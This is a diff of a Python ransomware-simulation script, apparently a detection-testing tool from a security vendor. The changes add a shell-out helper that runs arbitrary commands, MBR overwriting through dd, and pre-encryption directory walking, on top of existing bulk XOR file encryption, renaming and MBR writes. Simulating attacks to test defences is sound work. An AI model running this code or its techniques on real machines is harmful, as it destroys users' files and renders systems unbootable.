@@ -7,19 +7,19 @@
 # author:   bsturk - bsturk@carbonblack.com
 #
 # dependencies:
-#           pip install puremagic ( also installs argparse )
+#           pip install puremagic (also installs argparse)
 #           pip install requests
-#           pip install pypiwin32 -or- win32api installer ( https://sourceforge.net/projects/pywin32/files/pywin32/ )
+#           pip install pypiwin32 -or- win32api installer (https://sourceforge.net/projects/pywin32/files/pywin32/)
 #
 # created:  01/30/17
-# last_mod: 07/31/18
-# version:  1.10
+# last_mod: 12/18/19
+# version:  1.11
 #
 # usage, etc:
 # 
 #   e.g. python pseudo_ransomware.py -r -p file_dir -x .crypt -N http://www.wtfismyip.com -c 1 -w 3
 #
-# exe generation ( not currently working ):
+# exe generation (NOT CURRENTLY WORKING):
 #
 #           python setup.py py2exe
 #
@@ -48,6 +48,9 @@
 #   1.8     08/31/17 - Updated script to not limit MBR writes to 512 bytes.
 #   1.9     09/13/17 - Added option to open a handle to the disk for MBR writes N times.
 #   1.10    07/31/18 - Added option to alternate between 2 extensions every n files for renamed, written files.
+#   1.11    12/18/19 - Added support for iteration/encryption done by an individual cmd line invocation.  Also
+#                      added support for doing MBR writes via LOLbin, i.e. dd(1).  Added support for pre-encryption
+#                      directory iteration.
 #
 ###############################################################################
 
@@ -95,6 +98,9 @@ write_method                               = WRITE_METHOD_INLINE
 read_method                                = READ_METHOD_NORMAL
 encryption_method                          = ENCRYPT_METHOD_XOR
 encryption_command                         = ''
+full_command                               = ''
+mbr_command                                = ''
+pre_enc_dir                                = ''
 iteration_command                          = ''
 xor_key                                    = 42
 skip_hidden                                = False
@@ -365,6 +371,26 @@ def write_mbr( _device, _file ):
 
 #############
 
+def run_cmd( _cmd ):
+
+        try:
+            p = subprocess.Popen( _cmd, stdout = subprocess.PIPE, shell = True )
+
+        except Exception as e:
+            print 'run_cmd(): Exception - Command %s failed to run (%s)' % ( _cmd, str( e ) )
+            return []
+
+        for line in p.stdout.readlines():
+            print line
+
+        p.wait()
+
+        if ( p.returncode <> 0 ):
+            print 'run_cmd(): Command %s failed to run: %d' % ( _cmd, p.returncode )
+
+
+#############
+
 def get_filenames( _path ):
 
     files = []
@@ -430,44 +456,53 @@ def run():
     if win_write_mbr_file <> '':
         write_mbr_winapi( win_write_mbr_file )
 
-    ## TODO: other platforms need to pass in /dev/sdX (Linux) or /dev/diskX (Mac)
+    if mbr_command <> '':
+        run_cmd( mbr_command )
+
+    if pre_enc_dir <> '':
+        get_filenames( pre_enc_dir )
 
     if pre_netconn <> '':
         make_network_connection( pre_netconn )
 
-    for path in paths:
+    if full_command <> '':
+        run_cmd( full_command )
+        
+    else:
 
-        print 'Iterating files in ' + path
+        for path in paths:
 
-        files = get_filenames( path )
+            print 'Iterating files in ' + path
 
-        for f in files:
+            files = get_filenames( path )
 
-            fname, fext = os.path.splitext( f )
+            for f in files:
 
-            if len( exts ) == 0 or fext in exts:
+                fname, fext = os.path.splitext( f )
 
-                if skip_hidden and is_hidden( f ):
-                    print 'Skipping hidden file ' + f
-                    continue
+                if len( exts ) == 0 or fext in exts:
 
-                ok = True
+                    if skip_hidden and is_hidden( f ):
+                        print 'Skipping hidden file ' + f
+                        continue
 
-                if ( do_magic ):
+                    ok = True
 
-                    try:
-                        mext = puremagic.from_file( f )
+                    if ( do_magic ):
 
-                        if fext.lower() not in mext:
-                            print 'Improper identification - claimed ' + fext + ', ident as ' + mext + ', skipping...'
-                            ok = False
+                        try:
+                            mext = puremagic.from_file( f )
 
-                    except puremagic.PureError:
-                        print 'Couldn\'t identify file, encrypting anyway...'
-                        ok = True
+                            if fext.lower() not in mext:
+                                print 'Improper identification - claimed ' + fext + ', ident as ' + mext + ', skipping...'
+                                ok = False
 
-                if ok:
-                    success = encrypt_file( f )
+                        except puremagic.PureError:
+                            print 'Couldn\'t identify file, encrypting anyway...'
+                            ok = True
+
+                    if ok:
+                        success = encrypt_file( f )
 
     if post_netconn <> '':
         make_network_connection( post_netconn )
@@ -558,6 +593,9 @@ def handle_args():
     global encryption_method
     global encryption_command
     global iteration_command
+    global full_command
+    global mbr_command
+    global pre_enc_dir
     global skip_hidden
     global dir_recurse
     global rename_extension_1
@@ -578,6 +616,9 @@ def handle_args():
     parser.add_argument( '-c', '--encmethod', type = encryption_method_type, help = 'encryption method: 0 - none; 1 - xor; 2 - external command; default = 1' )
     parser.add_argument( '-C', '--enccmd', help = 'encryption command invocation, specify marker for basename with %f, dir with %d, and filename and extension with %F: i.e. zip %d\%f.encrypt %d\%F' )
     parser.add_argument( '-I', '--itercmd', help = 'file iteration command invocation, specify marker for dir with %d, i.e. find -type f %d or dir /s *txt*' )
+    parser.add_argument( '-F', '--fullcmd', help = 'command line for completely shelling out to commands to do all iteration/encryption' )
+    parser.add_argument( '-D', '--preencdir', help = 'directory to iterate (and not encrypt) before iterating on specified path(s) to encrypt' )
+    parser.add_argument( '-M', '--mbrcmd', help = 'command line for writing to MBR, i.e. dd(1)' )
     parser.add_argument( '-H', '--skiphidden', help = 'skip hidden files', action = 'store_true' )
     parser.add_argument( '-r', '--recurse', help = 'recurse into directories', action = 'store_true' )
     parser.add_argument( '-x', '--renameext1', help = 'first extension to use for renamed written file' )
@@ -599,118 +640,132 @@ def handle_args():
     else:
         paths = args.paths.split( ',' )
 
-    print '===== encrypting files in ====='
+        print '===== encrypting files in ====='
 
-    for path in paths:
-        print '\t' + path
-        
-    print
-
-    if args.extensions is not None:
-
-        print args.extensions
-
-        exts = args.extensions.split( ',' )
-
-        print '===== with extensions ====='
-
-        for ext in exts:
-            print '\t' + ext
-        
+        for path in paths:
+            print '\t' + path
+            
         print
 
-    if args.skiphidden is not None:
-        skip_hidden = args.skiphidden
+    if paths <> []:        ## not doing a fullcmd
 
-    if skip_hidden:
-        print '===== skipping hidden files ====='
+        if args.extensions is not None:
 
-    else:
-        print '===== including hidden files ====='
+            print args.extensions
 
-    print
+            exts = args.extensions.split( ',' )
 
-    if args.recurse is not None:
-        dir_recurse = args.recurse
+            print '===== with extensions ====='
 
-    if dir_recurse:
-        print '===== recursing into specified directories ====='
+            for ext in exts:
+                print '\t' + ext
+            
+            print
 
-    else:
-        print '===== NOT recursing into specified directories ====='
+        if args.skiphidden is not None:
+            skip_hidden = args.skiphidden
 
-    print
+        if skip_hidden:
+            print '===== skipping hidden files ====='
 
-    if args.writemethod is not None:
-        write_method = args.writemethod
-        print_write_method( 'override', write_method )
+        else:
+            print '===== including hidden files ====='
 
-    else:
-        print_write_method( 'default', write_method )
+        print
 
-    if args.enccmd is not None:
-        read_method        = READ_METHOD_NONE
-        encryption_command = args.enccmd
-        print '===== encrypting using command %s =====' % ( encryption_command, )
+        if args.recurse is not None:
+            dir_recurse = args.recurse
 
-    if args.encmethod is not None:
-        encryption_method = args.encmethod
-        print_enc_method( 'override', encryption_method )
+        if dir_recurse:
+            print '===== recursing into specified directories ====='
 
-    else:
-        print_enc_method( 'default', encryption_method )
+        else:
+            print '===== NOT recursing into specified directories ====='
 
-    if args.itercmd is not None:
-        iteration_command = args.itercmd
-        print '===== iterating using command %s =====' % ( iteration_command, )
+        print
 
-    if args.renameext1 is not None:
-        rename_extension_1 = args.renameext1
-        print '===== rename extension is %s =====' % ( rename_extension_1 )
+        if args.writemethod is not None:
+            write_method = args.writemethod
+            print_write_method( 'override', write_method )
 
-    if args.renameext2 is not None:
-        rename_extension_2 = args.renameext2
-        print '===== rename extension 2 is %s =====' % ( rename_extension_2 )
+        else:
+            print_write_method( 'default', write_method )
 
-    if args.postrename is not None and args.postrename:
-        post_rename = args.postrename
-        print '===== renaming modified file inline ====='
+        if args.enccmd is not None:
+            read_method        = READ_METHOD_NONE
+            encryption_command = args.enccmd
+            print '===== encrypting using command %s =====' % ( encryption_command, )
 
-    if args.domagic is not None and args.domagic:
-        do_magic = args.domagic
-        print '===== verifing file contents (via libmagic) against extension ====='
+        if args.encmethod is not None:
+            encryption_method = args.encmethod
+            print_enc_method( 'override', encryption_method )
 
-    if args.prenetconn is not None:
-        pre_netconn = args.prenetconn
-        print '===== will connect to at %s start =====' % ( pre_netconn )
+        else:
+            print_enc_method( 'default', encryption_method )
 
-    if args.postnetconn is not None:
-        post_netconn = args.postnetconn
-        print '===== will connect to at %s end =====' % ( post_netconn )
+        if args.itercmd is not None:
+            iteration_command = args.itercmd
+            print '===== iterating using command %s =====' % ( iteration_command, )
+
+        if args.renameext1 is not None:
+            rename_extension_1 = args.renameext1
+            print '===== rename extension is %s =====' % ( rename_extension_1 )
+
+        if args.renameext2 is not None:
+            rename_extension_2 = args.renameext2
+            print '===== rename extension 2 is %s =====' % ( rename_extension_2 )
+
+        if args.postrename is not None and args.postrename:
+            post_rename = args.postrename
+            print '===== renaming modified file inline ====='
+
+        if args.domagic is not None and args.domagic:
+            do_magic = args.domagic
+            print '===== verifing file contents (via libmagic) against extension ====='
+
+        if args.prenetconn is not None:
+            pre_netconn = args.prenetconn
+            print '===== will connect to at %s start =====' % ( pre_netconn )
+
+        if args.postnetconn is not None:
+            post_netconn = args.postnetconn
+            print '===== will connect to at %s end =====' % ( post_netconn )
+
+        if args.alternate is not None:
+
+            assert( rename_extension_2 is not None )
+
+            num_alternate = args.alternate
+            print 'Extensions will alternate every ' + num_alternate + ' lines between ' + rename_extension_1 + ' and ' + rename_extension_2
+
+            # initialize pattern if alternate is specified
+
+            file_extension_pattern = itertools.cycle( int( num_alternate ) * [ str( rename_extension_1 ) ] + int( num_alternate ) * [ str( rename_extension_2 ) ] )
+
+        else:
+            # just use the first extension
+
+            file_extension_pattern = itertools.cycle( [ rename_extension_1 ] )
 
     if args.winwritembr is not None:
         win_write_mbr_file = args.winwritembr
         print '===== Will write contents of %s to MBR on \\\\.\\PhysicalDrive0 =====' % ( win_write_mbr_file )
 
-    if args.alternate is not None:
+    if args.fullcmd is not None:
+        full_command = args.fullcmd
+        print '===== Will execute this command to do iteration/encryption/etc -- ' + full_command + ' ====='
 
-        assert( rename_extension_2 is not None )
-
-        num_alternate = args.alternate
-        print 'Extensions will alternate every ' + num_alternate + ' lines between ' + rename_extension_1 + ' and ' + rename_extension_2
-
-        # initialize pattern if alternate is specified
-
-        file_extension_pattern = itertools.cycle( int( num_alternate ) * [ str( rename_extension_1 ) ] + int( num_alternate ) * [ str( rename_extension_2 ) ] )
-
-    else:
-        # just use the first extension
-
-        file_extension_pattern = itertools.cycle( [ rename_extension_1 ] )
+    if args.mbrcmd is not None:
+        mbr_command = args.mbrcmd
+        print '===== Will execute this command to write to MBR ' + mbr_command + ' ====='
 
     if args.numhandlembr is not None:
         num_mbr_handles = int( args.numhandlembr )
         print '===== will open a handle to the disk for MBR writes ' + str( num_mbr_handles ) + ' times ====='
+
+    if args.preencdir is not None:
+        pre_enc_dir = args.preencdir
+        print '===== will iterate files in %s before walking specified paths(s) and encrypting' % ( pre_enc_dir ) + ' ====='
 
 #############
 
